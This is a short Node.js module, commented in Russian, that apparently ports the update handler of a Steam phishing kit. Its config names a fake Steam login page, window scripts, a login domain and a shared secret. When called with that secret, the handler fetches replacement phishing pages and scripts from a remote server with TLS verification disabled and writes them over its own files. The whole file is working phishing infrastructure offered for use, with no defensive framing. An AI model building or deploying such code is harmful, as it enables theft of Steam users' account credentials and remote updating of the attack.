const axios = require('axios');
const fs = require('fs');
const path = require('path');

// Конфигурация из PHP файла
const config = {
    phpName: "deab0093a0f4551414b49ba57151ae08.php",
    steamHtmlName: "6kaomrcjpf2m.html",
    steamScriptName: "bhcg4ddaadpt.js",
    windowScriptName: "ocbp8i7rp6hv.js",
    domainToLogin: "oldwwweeeewee.com",
    resourceUrl: "https://oldwwweeeewee.com/fa3436t20izhvt8a9hlb4aubmyie2l4k6clds",
    postData: {
        secret: "9871633e20ecabe626b91816ea044bb7",
        authBtnClass: "e8gyjt8s0qog",
        steamHtmlName: "6kaomrcjpf2m.html",
        steamScriptName: "bhcg4ddaadpt.js",
        windowScriptName: "ocbp8i7rp6hv.js",
    },
    buildId: "483a6dec-15ef-43f7-a9df-80ac4d102086",
    version: "2"
};

// Обработчик для эмуляции PHP файла
async function handlePhpRequest(req, res) {
    const update = req.query.update === 'true';
    const secret = req.query.secret || null;

    if (secret !== config.postData.secret) {
        return res.send("false");
    }

    if (update) {
        try {
            // Делаем запрос к ресурсу для обновления
            const response = await axios.post(config.resourceUrl, config.postData, {
                headers: {
                    'Content-Type': 'application/json'
                },
                httpsAgent: new (require('https').Agent)({
                    rejectUnauthorized: false
                })
            });

            const responseData = response.data;

            // Обновляем файлы если есть новые версии
            if (responseData.windowScript) {
                fs.writeFileSync(path.join(__dirname, config.windowScriptName), responseData.windowScript);
            }

            if (responseData.steamScript) {
                fs.writeFileSync(path.join(__dirname, config.steamScriptName), responseData.steamScript);
            }

            if (responseData.steamFile) {
                fs.writeFileSync(path.join(__dirname, config.steamHtmlName), responseData.steamFile);
            }

            if (responseData.updatePhp) {
                fs.writeFileSync(path.join(__dirname, config.phpName), responseData.updatePhp);
            }

            res.send("success");
        } catch (error) {
            console.error('Update error:', error);
            res.send("Error: " + error.message);
        }
    } else {
        // Возвращаем информацию о версии
        res.json({
            success: true,
            buildId: config.buildId,
            version: config.version
        });
    }
}

module.exports = {
    handlePhpRequest,
    config
};
